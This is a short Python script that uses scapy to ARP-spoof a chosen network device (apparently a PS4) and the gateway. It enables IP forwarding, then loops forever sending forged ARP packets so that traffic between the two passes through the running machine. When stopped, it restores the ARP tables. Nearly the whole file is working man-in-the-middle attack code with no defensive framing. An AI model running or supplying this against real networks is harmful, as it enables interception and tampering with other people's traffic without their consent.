#!/usr/bin/env python3

import scapy.all as net
import sys, os, time, math, threading

sys.path.append(os.path.join(os.path.dirname(__file__), ".."))
import get_machines

VERBOSITY = 0

print("Finding network devices...")
machines = get_machines.search(ps4=True)

print("Enabling IP Forward...")
with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
	f.write("1")

try:
	print("Altering ARP...")
	while True:
		#hwdst is the actual recepient of the ARP packet, src is where the requests want to go, dst is where they end up
		net.send(net.ARP(op="who-has", hwdst=machines["target"].mac, pdst=machines["target"].ip, psrc=machines["gateway"].ip), verbose=VERBOSITY)
		net.send(net.ARP(op="who-has", hwdst=machines["gateway"].mac, pdst=machines["gateway"].ip, psrc=machines["target"].ip), verbose=VERBOSITY)
		time.sleep(5) #typically kept in the ARP cache for 60s

except KeyboardInterrupt:
	pass

print("Restoring ARP...")
net.send(net.ARP(op="who-has", hwdst=machines["target"].mac, pdst=machines["target"].ip, hwsrc=machines["gateway"].mac, psrc=machines["gateway"].ip), verbose=VERBOSITY)
net.send(net.ARP(op="who-has", hwdst=machines["gateway"].mac, pdst=machines["gateway"].ip, hwsrc=machines["target"].mac, psrc=machines["target"].ip), verbose=VERBOSITY)

print("Disabling IP Forward...")
with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
	f.write("0")
